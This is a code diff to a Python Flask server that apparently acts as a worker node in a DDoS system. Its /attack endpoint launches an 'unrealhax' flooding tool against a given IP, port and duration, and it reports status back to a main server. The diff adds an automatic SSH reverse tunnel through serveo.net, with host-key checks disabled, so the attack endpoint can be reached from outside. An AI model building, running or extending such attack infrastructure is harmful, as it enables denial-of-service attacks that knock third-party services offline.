@@ -3,6 +3,7 @@ import asyncio
 import logging
 import os
 import threading
+import subprocess
 import requests
 
 # Set up logging for the child server
@@ -17,8 +18,17 @@ server_status = 'idle'
 # Payload for acknowledgment to main server
 payload = {
     'status': 'completed',
-    'server': 'server2'  
+    'server': 'supreme-cod-7w9rpxqxq67fj7g'  
 }
+ssh_command = [
+        "ssh",
+        "-i", "/workspaces/Ddos/serverkey",
+        "-o", "StrictHostKeyChecking=no",
+        "-o", "UserKnownHostsFile=/dev/null",
+        "-R", "imtakedown001.serveo.net:80:localhost:5000",
+        "serveo.net"
+    ]   
+
 
 # Heartbeat endpoint to report the server's status
 @app.route('/heartbeat', methods=['GET'])
@@ -28,7 +38,7 @@ def heartbeat():
 # Async function to run the attack
 async def run_attack(ip, port, duration):
     global server_status
-    server_status = 'busy'  # Set server status to busy when attack starts
+    server_status = 'busy'
     try:
         # Log the command being executed
         logging.info(f"Running attack command: ./unrealhax {ip} {port} {duration} 10")
@@ -103,6 +113,27 @@ def attack():
     # Return the response immediately
     return jsonify({"result": "Attack started"}), 200
 
+
+def run_ssh_command():
+
+    try:
+        # Execute the SSH command
+        result = subprocess.run(ssh_command, check=True, text=True, capture_output=True)
+        
+        # Print the output from the command
+        print("Output:", result.stdout)
+        print("Error:", result.stderr)
+
+    except subprocess.CalledProcessError as e:
+        print("An error occurred while executing the command:", e)
+        print("Return code:", e.returncode)
+        print("Output:", e.output)
+        print("Error:", e.stderr)
+
 if __name__ == '__main__':
+
+    ssh_thread = threading.Thread(target=run_ssh_command)
+    ssh_thread.start()
+
     port = int(os.environ.get("PORT", 5000))  # Allow the port to be configurable
     app.run(host='0.0.0.0', port=port, debug=True)
